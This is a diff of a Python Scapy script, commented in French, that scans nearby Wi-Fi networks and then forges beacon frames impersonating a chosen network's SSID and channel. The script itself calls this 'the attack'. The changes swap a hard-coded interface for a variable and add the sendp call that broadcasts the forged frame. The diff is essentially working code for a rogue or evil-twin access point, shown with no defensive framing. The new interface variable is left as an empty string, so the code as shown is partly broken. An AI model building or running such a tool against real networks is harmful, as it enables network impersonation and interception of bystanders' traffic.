@@ -1,6 +1,7 @@
 from scapy.all import *
 from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
 
+ifname = ''
 network_list = []
 
 # Fonction pour extraire les informations des trames Beacon
@@ -25,7 +26,7 @@ def concurrent_beacon(ssid, channel, ifname):
 
 # Scanne des réseaux à proximité
 print("Scanning nearby Wi-Fi networks...")
-sniff(iface="wlan0", prn=getNetwork, timeout=10)
+sniff(iface=ifname, prn=getNetwork, timeout=10)
 
 # Affiche les informations des réseaux découverts
 print("\nList of nearby Wi-Fi networks:")
@@ -58,4 +59,5 @@ if validation != "Y" and validation != "y":
     print("The attack has been canceled. Exiting...")
     exit()
 
-concurrent_beacon(ssid, channel, "wlan0")
+frame = concurrent_beacon(ssid, channel, ifname)
+sendp(frame, iface=ifname, verbose=False)
